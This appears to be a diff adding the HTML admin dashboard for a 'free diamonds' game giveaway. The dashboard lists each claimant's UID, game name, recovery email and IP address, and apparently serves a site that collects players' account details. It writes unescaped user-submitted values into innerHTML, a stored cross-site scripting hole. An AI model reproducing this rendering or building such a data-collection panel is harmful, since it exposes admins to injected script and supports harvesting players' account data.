@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FF Diamond Admin | Premium Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: linear-gradient(135deg, #0a0a0f 0%, #0f0a1a 100%);
+            min-height: 100vh;
+            color: #fff;
+        }
+
+        /* Premium Background */
+        .bg-premium {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background: 
+                radial-gradient(ellipse at 20% 30%, rgba(255,215,0,0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 70%, rgba(176,68,255,0.08) 0%, transparent 50%),
+                repeating-linear-gradient(45deg, rgba(255,255,255,0.02) 0px, rgba(255,255,255,0.02) 2px, transparent 2px, transparent 8px);
+        }
+
+        /* Glass Container */
+        .glass-admin {
+            position: relative;
+            z-index: 1;
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Login Card */
+        .login-card {
+            max-width: 420px;
+            margin: 100px auto;
+            background: rgba(10, 10, 20, 0.7);
+            backdrop-filter: blur(20px);
+            border-radius: 32px;
+            padding: 40px;
+            text-align: center;
+            border: 1px solid rgba(255,215,0,0.3);
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+        }
+
+        .login-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .login-card h2 {
+            font-family: 'Orbitron', monospace;
+            font-size: 24px;
+            margin-bottom: 30px;
+            letter-spacing: 2px;
+        }
+
+        .login-card input {
+            width: 100%;
+            padding: 14px 18px;
+            margin-bottom: 15px;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,215,0,0.3);
+            border-radius: 12px;
+            color: white;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+
+        .login-card input:focus {
+            outline: none;
+            border-color: #FFD700;
+            background: rgba(255,215,0,0.1);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            border: none;
+            border-radius: 40px;
+            font-family: 'Orbitron', monospace;
+            font-weight: bold;
+            font-size: 14px;
+            color: #0a0a0f;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px -5px rgba(255,215,0,0.3);
+        }
+
+        /* Dashboard Header */
+        .dashboard-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255,215,0,0.2);
+        }
+
+        .header-title h1 {
+            font-family: 'Orbitron', monospace;
+            font-size: 28px;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .header-title p {
+            font-size: 12px;
+            opacity: 0.6;
+            margin-top: 5px;
+        }
+
+        .admin-info {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            background: rgba(255,255,255,0.05);
+            padding: 8px 20px;
+            border-radius: 40px;
+        }
+
+        .admin-avatar {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+
+        .logout-btn {
+            background: rgba(255,68,68,0.2);
+            border: 1px solid rgba(255,68,68,0.5);
+            padding: 8px 20px;
+            border-radius: 40px;
+            color: #ff6b6b;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .logout-btn:hover {
+            background: rgba(255,68,68,0.4);
+            transform: scale(1.02);
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: linear-gradient(135deg, rgba(255,215,0,0.1), rgba(255,100,0,0.05));
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            border: 1px solid rgba(255,215,0,0.2);
+            transition: all 0.3s;
+            backdrop-filter: blur(10px);
+        }
+
+        .stat-card:hover {
+            transform: translateY(-3px);
+            border-color: rgba(255,215,0,0.5);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+
+        .stat-icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .stat-number {
+            font-family: 'Orbitron', monospace;
+            font-size: 36px;
+            font-weight: bold;
+            color: #FFD700;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            letter-spacing: 1px;
+            opacity: 0.7;
+            margin-top: 5px;
+        }
+
+        /* Tables */
+        .claims-table-container, .logs-table-container {
+            background: rgba(10, 10, 20, 0.5);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            padding: 20px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255,215,0,0.2);
+        }
+
+        .section-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 18px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .table-wrapper {
+            overflow-x: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        th {
+            color: #FFD700;
+            font-weight: 600;
+            font-size: 12px;
+            letter-spacing: 1px;
+        }
+
+        td {
+            font-size: 13px;
+        }
+
+        .badge-diamond {
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: bold;
+            color: #1a1a2e;
+            display: inline-block;
+        }
+
+        .status-badge {
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: bold;
+        }
+        .status-pending { background: rgba(255,165,0,0.2); color: #ffa500; }
+        .status-processing { background: rgba(0,245,255,0.2); color: #00f5ff; }
+        .status-completed { background: rgba(0,255,0,0.2); color: #0f0; }
+        .status-failed { background: rgba(255,0,0,0.2); color: #f00; }
+
+        .action-btn {
+            background: none;
+            border: none;
+            color: #FFD700;
+            cursor: pointer;
+            padding: 5px 8px;
+            border-radius: 8px;
+            transition: all 0.2s;
+        }
+        .action-btn:hover {
+            background: rgba(255,215,0,0.2);
+        }
+
+        .refresh-btn {
+            background: rgba(255,215,0,0.2);
+            border: 1px solid rgba(255,215,0,0.3);
+            padding: 8px 16px;
+            border-radius: 40px;
+            color: #FFD700;
+            cursor: pointer;
+            font-size: 12px;
+        }
+
+        @media (max-width: 768px) {
+            .glass-admin { padding: 15px; }
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            th, td { padding: 8px 10px; font-size: 11px; }
+        }
+    </style>
+</head>
+<body>
+<div class="bg-premium"></div>
+
+<div class="glass-admin" id="app">
+    <!-- Login View -->
+    <div id="loginView" style="display: none;">
+        <div class="login-card">
+            <div class="login-icon">
+                <i class="fas fa-crown"></i>
+            </div>
+            <h2>ADMIN ACCESS</h2>
+            <input type="text" id="adminUsername" placeholder="Username" autocomplete="off">
+            <input type="password" id="adminPassword" placeholder="Password">
+            <button class="login-btn" onclick="adminLogin()">
+                <i class="fas fa-unlock-alt"></i> LOGIN
+            </button>
+        </div>
+    </div>
+
+    <!-- Dashboard View -->
+    <div id="dashboardView" style="display: none;">
+        <div class="dashboard-header">
+            <div class="header-title">
+                <h1><i class="fas fa-diamond"></i> FF DIAMOND ADMIN</h1>
+                <p>Premium Giveaway Management System</p>
+            </div>
+            <div class="admin-info">
+                <div class="admin-avatar">
+                    <i class="fas fa-user-shield"></i>
+                </div>
+                <span id="adminName">Admin</span>
+                <button class="logout-btn" onclick="adminLogout()">
+                    <i class="fas fa-sign-out-alt"></i> Logout
+                </button>
+            </div>
+        </div>
+
+        <!-- Stats Grid -->
+        <div class="stats-grid" id="statsGrid"></div>
+
+        <!-- Claims Table -->
+        <div class="claims-table-container">
+            <div class="section-title">
+                <i class="fas fa-list-ul"></i> RECENT CLAIMS
+                <button class="refresh-btn" onclick="loadData()" style="margin-left: auto;">
+                    <i class="fas fa-sync-alt"></i> Refresh
+                </button>
+            </div>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>UID</th>
+                            <th>Game Name</th>
+                            <th>Diamonds</th>
+                            <th>Server</th>
+                            <th>Email</th>
+                            <th>IP Address</th>
+                            <th>Status</th>
+                            <th>Time</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="claimsTableBody">
+                        <tr><td colspan="9" style="text-align: center;">Loading...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Admin Logs -->
+        <div class="logs-table-container">
+            <div class="section-title">
+                <i class="fas fa-history"></i> ADMIN ACTIVITY LOGS
+            </div>
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Admin</th>
+                            <th>Action</th>
+                            <th>IP Address</th>
+                            <th>Time</th>
+                        </tr>
+                    </thead>
+                    <tbody id="logsTableBody">
+                        <tr><td colspan="4" style="text-align: center;">Loading...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    let isAdmin = false;
+
+    async function checkAdmin() {
+        try {
+            const res = await fetch('/api/admin/check');
+            const data = await res.json();
+            if (data.isAdmin) {
+                isAdmin = true;
+                showDashboard();
+                loadData();
+                loadLogs();
+            } else {
+                showLogin();
+            }
+        } catch(e) {
+            showLogin();
+        }
+    }
+
+    function showLogin() {
+        document.getElementById('loginView').style.display = 'block';
+        document.getElementById('dashboardView').style.display = 'none';
+    }
+
+    function showDashboard() {
+        document.getElementById('loginView').style.display = 'none';
+        document.getElementById('dashboardView').style.display = 'block';
+    }
+
+    async function adminLogin() {
+        const username = document.getElementById('adminUsername').value;
+        const password = document.getElementById('adminPassword').value;
+        
+        const res = await fetch('/api/admin/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, password })
+        });
+        
+        const data = await res.json();
+        if (data.success) {
+            isAdmin = true;
+            document.getElementById('adminName').innerHTML = `<i class="fas fa-user"></i> ${username}`;
+            showDashboard();
+            loadData();
+            loadLogs();
+        } else {
+            alert('❌ Invalid credentials!');
+        }
+    }
+
+    async function adminLogout() {
+        await fetch('/api/admin/logout', { method: 'POST' });
+        isAdmin = false;
+        showLogin();
+    }
+
+    async function loadData() {
+        const res = await fetch('/api/admin/claims');
+        const data = await res.json();
+        
+        if (data.success) {
+            // Update stats
+            const stats = data.stats;
+            const diamondKeys = Object.keys(stats.byDiamond);
+            const diamondHtml = diamondKeys.map(amt => `
+                <div class="stat-card">
+                    <div class="stat-icon">💎</div>
+                    <div class="stat-number">${stats.byDiamond[amt]}</div>
+                    <div class="stat-label">${amt} Diamond Claims</div>
+                </div>
+            `).join('');
+            
+            document.getElementById('statsGrid').innerHTML = `
+                <div class="stat-card">
+                    <div class="stat-icon">📊</div>
+                    <div class="stat-number">${stats.total}</div>
+                    <div class="stat-label">Total Claims</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">📅</div>
+                    <div class="stat-number">${stats.today}</div>
+                    <div class="stat-label">Today's Claims</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">📆</div>
+                    <div class="stat-number">${stats.thisWeek}</div>
+                    <div class="stat-label">This Week</div>
+                </div>
+                ${diamondHtml}
+            `;
+            
+            // Update table
+            const tbody = document.getElementById('claimsTableBody');
+            if (data.claims.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="9" style="text-align: center;">No claims yet</td></tr>';
+            } else {
+                tbody.innerHTML = data.claims.map(claim => `
+                    <tr>
+                        <td><strong>${claim.uid}</strong></td>
+                        <td>${claim.gameName}</td>
+                        <td><span class="badge-diamond">${claim.diamondAmount} 💎</span></td>
+                        <td>${claim.server || 'IND'}</td>
+                        <td>${claim.recoveryEmail}</td>
+                        <td><small>${claim.ipAddress || 'N/A'}</small></td>
+                        <td><span class="status-badge status-${claim.status}">${claim.status}</span></td>
+                        <td><small>${new Date(claim.claimedAt).toLocaleString()}</small></td>
+                        <td>
+                            <button class="action-btn" onclick="updateStatus('${claim._id}', 'completed')" title="Mark Complete">
+                                <i class="fas fa-check-circle"></i>
+                            </button>
+                            <button class="action-btn" onclick="deleteClaim('${claim._id}')" title="Delete">
+                                <i class="fas fa-trash"></i>
+                            </button>
+                        </td>
+                    </tr>
+                `).join('');
+            }
+        }
+    }
+
+    async function loadLogs() {
+        try {
+            const res = await fetch('/api/admin/logs');
+            const data = await res.json();
+            if (data.success) {
+                const tbody = document.getElementById('logsTableBody');
+                tbody.innerHTML = data.logs.map(log => `
+                    <tr>
+                        <td>${log.username}</td>
+                        <td><span class="status-badge status-${log.action}">${log.action}</span></td>
+                        <td><small>${log.ipAddress || 'N/A'}</small></td>
+                        <td><small>${new Date(log.timestamp).toLocaleString()}</small></td>
+                    </tr>
+                `).join('');
+            }
+        } catch(e) {
+            console.log('Logs not available');
+        }
+    }
+
+    async function updateStatus(id, status) {
+        const res = await fetch(`/api/admin/claims/${id}/status`, {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ status })
+        });
+        if (res.ok) {
+            loadData();
+        }
+    }
+
+    async function deleteClaim(id) {
+        if (confirm('Are you sure you want to delete this claim?')) {
+            await fetch(`/api/admin/claims/${id}`, { method: 'DELETE' });
+            loadData();
+        }
+    }
+
+    // Auto refresh every 10 seconds
+    setInterval(() => {
+        if (isAdmin) {
+            loadData();
+        }
+    }, 10000);
+
+    checkAdmin();
+</script>
+</body>
+</html>
